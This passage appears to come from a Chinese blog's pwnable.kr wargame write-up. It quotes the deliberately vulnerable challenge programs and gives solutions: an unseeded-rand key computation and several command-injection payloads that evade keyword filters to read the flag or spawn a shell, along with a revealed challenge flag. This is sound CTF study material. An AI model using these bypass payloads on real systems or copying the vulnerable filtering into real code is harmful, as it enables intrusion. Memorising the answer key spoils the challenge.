class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">    welcome();</span><br><span class="line">    login();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// something after login...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br></pre></td></tr></table></figure>
+
+<p>这里的 100s 是限制输入长度不能超过 100，超过就 <code>Segmentation fault (core dumped)</code>。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passcode@pwnable:~$ checksec passcode</span><br><span class="line">[*] '/home/passcode/passcode'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>这个题有点意思，考的是 GOT 表劫持。</p>
+<h1 id="random-1-pt"><a href="#random-1-pt" class="headerlink" title="random - 1 pt"></a>random - 1 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy, teach me how to use random value in programming!</span><br><span class="line"></span><br><span class="line">ssh random@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">    random = rand();  <span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((key ^ random) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>未指定 srand 播种，则每次都是默认种子，所以每次运行得到的随机数是固定的。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdlib.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d	"</span>, rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1804289383  846930886  1681692777  1714636915  1957747793</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p random</span><br><span class="line">$1 = 1804289383</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 1804289383 ^ 0xdeadbeef</span><br><span class="line">3039230856</span><br></pre></td></tr></table></figure>
+
+<h1 id="input-4-pt"><a href="#input-4-pt" class="headerlink" title="input - 4 pt"></a>input - 4 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mom? how can I pass my input to a computer program?</span><br><span class="line"></span><br><span class="line">ssh input2@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], <span class="keyword">char</span> *envp[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// argv</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>], <span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>], <span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stdio</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// env</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// file</span></span><br><span class="line">    FILE *fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp) != <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// network</span></span><br><span class="line">    <span class="keyword">int</span> sd, cd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">    sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    saddr.sin_port = htons(atoi(argv[<span class="string">'C'</span>]));</span><br><span class="line">    <span class="keyword">if</span> (bind(sd, (struct sockaddr *) &amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    listen(sd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    cd = accept(sd, (struct sockaddr *) &amp;caddr, (<span class="keyword">socklen_t</span> * ) &amp; c);</span><br><span class="line">    <span class="keyword">if</span> (cd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here's your flag</span></span><br><span class="line">    system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="leg-2-pt"><a href="#leg-2-pt" class="headerlink" title="leg - 2 pt"></a>leg - 2 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy told me I should study arm.</span><br><span class="line">But I prefer to study my leg!</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/leg.c</span><br><span class="line">Download : http://pwnable.kr/bin/leg.asm</span><br><span class="line"></span><br><span class="line">ssh leg@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<h1 id="mistake-1-pt"><a href="#mistake-1-pt" class="headerlink" title="mistake - 1 pt"></a>mistake - 1 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">We all make mistakes, let&apos;s move on.</span><br><span class="line">(don&apos;t take this too seriously, no fancy hacking skill is required at all)</span><br><span class="line"></span><br><span class="line">This task is based on real event</span><br><span class="line">Thanks to dhmonkey</span><br><span class="line"></span><br><span class="line">hint : operator priority</span><br><span class="line"></span><br><span class="line">ssh mistake@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<h1 id="shellshock-1-pt"><a href="#shellshock-1-pt" class="headerlink" title="shellshock - 1 pt"></a>shellshock - 1 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy, there was a shocking news about bash.</span><br><span class="line">I bet you already know, but lets just make it sure :)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh shellshock@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<h1 id="coin1-6-pt"><a href="#coin1-6-pt" class="headerlink" title="coin1 - 6 pt"></a>coin1 - 6 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy, I wanna play a game!</span><br><span class="line">(if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9007</span><br></pre></td></tr></table></figure>
+
+<h1 id="blackjack-1-pt"><a href="#blackjack-1-pt" class="headerlink" title="blackjack - 1 pt"></a>blackjack - 1 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hey! check out this C implementation of blackjack game!</span><br><span class="line">I found it online</span><br><span class="line">* http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</span><br><span class="line"></span><br><span class="line">I like to give my flags to millionares.</span><br><span class="line">how much money you got?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9009</span><br></pre></td></tr></table></figure>
+
+<h1 id="lotto-2-pt"><a href="#lotto-2-pt" class="headerlink" title="lotto - 2 pt"></a>lotto - 2 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy! I made a lotto program for my homework.</span><br><span class="line">do you want to play?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh lotto@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Submit your 6 lotto bytes : "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Lotto Start!\n"</span>);</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// generate lotto numbers</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error. tell admin\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">if</span> (read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error2. tell admin\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;         <span class="comment">// 1 ~ 45</span></span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// calculate lotto score</span></span><br><span class="line">    <span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lotto[i] == submit[j]) &#123;</span><br><span class="line">                match++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// win!</span></span><br><span class="line">    <span class="keyword">if</span> (match == <span class="number">6</span>) &#123;</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"bad luck...\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- nLotto Rule -\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your goal is to match lotto numbers as many as you can\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"if you win lottery for *1st place*, you will get reward\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"for more details, follow the link below\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mathematical chance to win this game is known to be 1/8145060.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// menu</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"- Select Menu -\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1. Play Lotto\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2. Help\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"3. Exit\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (menu) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                play();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                help();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"bye\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"invalid menu\n"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="cmd1-1-pt"><a href="#cmd1-1-pt" class="headerlink" title="cmd1 - 1 pt"></a>cmd1 - 1 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy! what is PATH environment in Linux?</span><br><span class="line"></span><br><span class="line">ssh cmd1@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span> *cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r = <span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>) != <span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"sh"</span>) != <span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"tmp"</span>) != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line">    putenv(<span class="string">"PATH=/thankyouverymuch"</span>);</span><br><span class="line">    <span class="keyword">if</span> (filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    system(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有简单过滤的命令执行 ：）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd1@pwnable:~$ ./cmd1 '/bin/cat fl""ag'</span><br><span class="line">mommy now I get what PATH environment is for :)</span><br></pre></td></tr></table></figure>
+
+<h1 id="cmd2-9-pt"><a href="#cmd2-9-pt" class="headerlink" title="cmd2 - 9 pt"></a>cmd2 - 9 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy bought me a system command shell.</span><br><span class="line">but he put some filters to prevent me from playing with it without his permission...</span><br><span class="line">but I wanna play anytime I want!</span><br><span class="line"></span><br><span class="line">ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span> *cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r = <span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"="</span>) != <span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"PATH"</span>) != <span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"export"</span>) != <span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"/"</span>) != <span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"`"</span>) != <span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>) != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> **p;</span><br><span class="line">    <span class="keyword">for</span> (p = environ; *p; p++) <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[], <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line">    delete_env();</span><br><span class="line">    putenv(<span class="string">"PATH=/no_command_execution_until_you_become_a_hacker"</span>);</span><br><span class="line">    <span class="keyword">if</span> (filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    system(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有意思的点在于，在 <code>/</code> 没了的情况下绕 <code>PATH</code>。</p>
+<p>这有个小知识点，Bash、sh 的 built-in 命令。</p>
+<p><a href="http://manpages.ubuntu.com/manpages/xenial/man7/bash-builtins.7.html" target="_blank" rel="noopener">http://manpages.ubuntu.com/manpages/xenial/man7/bash-builtins.7.html</a></p>
+<p>下面的解法全是围绕这些 built-in 展开 ：）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">command [-pVv] command [arg ...]</span><br><span class="line">    Run  command  with  args suppressing the normal shell function lookup. Only builtin</span><br><span class="line">    commands or commands found in the PATH are executed.  If the -p  option  is  given,</span><br><span class="line">    the  search  for  command  is  performed  using  a  default  value for PATH that is</span><br><span class="line">    guaranteed to find all of the standard utilities.  If either the -V or -v option is</span><br><span class="line">    supplied,  a description of command is printed.  The -v option causes a single word</span><br><span class="line">    indicating the command or filename used to invoke command to be displayed;  the  -V</span><br><span class="line">    option  produces  a  more verbose description.  If the -V or -v option is supplied,</span><br><span class="line">    the exit status is 0 if command was found, and 1 if  not.   If  neither  option  is</span><br><span class="line">    supplied  and an error occurred or command cannot be found, the exit status is 127.</span><br><span class="line">    Otherwise, the exit status of the command builtin is the exit status of command.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cmd2@pwnable:~$ ./cmd2 'command -p cat fla*'</span><br><span class="line">command -p cat fla*g</span><br><span class="line">FuN_w1th_5h3ll_v4riabl3s_haha</span><br><span class="line"></span><br><span class="line">cmd2@pwnable:~$ ./cmd2 'read b &lt; f""lag; echo $b'</span><br><span class="line">read b &lt; f""lag; echo $b</span><br><span class="line">FuN_w1th_5h3ll_v4riabl3s_haha</span><br><span class="line"></span><br><span class="line">cmd2@pwnable:~$ ./cmd2 'set -s'</span><br><span class="line">set -s</span><br><span class="line">/bin/ls</span><br><span class="line">cmd2  cmd2.c  flag</span><br><span class="line">/bin/cat flag</span><br><span class="line">FuN_w1th_5h3ll_v4riabl3s_haha</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd / &amp;&amp; /home/cmd2/cmd2 '$(pwd)"bin"$(pwd)cat $(pwd)"home"$(pwd)"cmd2"$(pwd)"fl""ag"'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 八进制</span></span><br><span class="line">./cmd2 '$(printf \\057bin\\057cat) fl""ag'</span><br><span class="line">./cmd2 '$(echo "\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147")'</span><br><span class="line"></span><br><span class="line">./cmd2 '$(printf "%b%c%c%c%b%c%c%c%b%b%b%c%c%c%c" "\57" "b" "i" "n" "\57" "c" "a" "t" "\40" "\56" "\57" "f" "l" "a" "g")'</span><br><span class="line"></span><br><span class="line">echo "/bin/cat flag" | ./cmd2 "read myvar; command \$myvar"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./cmd2 '$(read a; echo $a)'</span><br><span class="line"><span class="meta">$</span><span class="bash">(<span class="built_in">read</span> a; <span class="built_in">echo</span> <span class="variable">$a</span>)</span></span><br><span class="line">/bin/cat flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./cmd2 '$(printf "\57bin\57sh")'</span><br><span class="line"><span class="meta">$</span><span class="bash"> /bin/cat &lt; flag</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="uaf-8-pt"><a href="#uaf-8-pt" class="headerlink" title="uaf - 8 pt"></a>uaf - 8 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy, what is Use After Free bug?</span><br><span class="line"></span><br><span class="line">ssh uaf@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<h1 id="memcpy-10-pt"><a href="#memcpy-10-pt" class="headerlink" title="memcpy - 10 pt"></a>memcpy - 10 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Are you tired of hacking?, take some rest here.</span><br><span class="line">Just help me out with my small experiment regarding memcpy performance. </span><br><span class="line">after that, flag is yours.</span><br><span class="line"></span><br><span class="line">http://pwnable.kr/bin/memcpy.c</span><br><span class="line"></span><br><span class="line">ssh memcpy@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
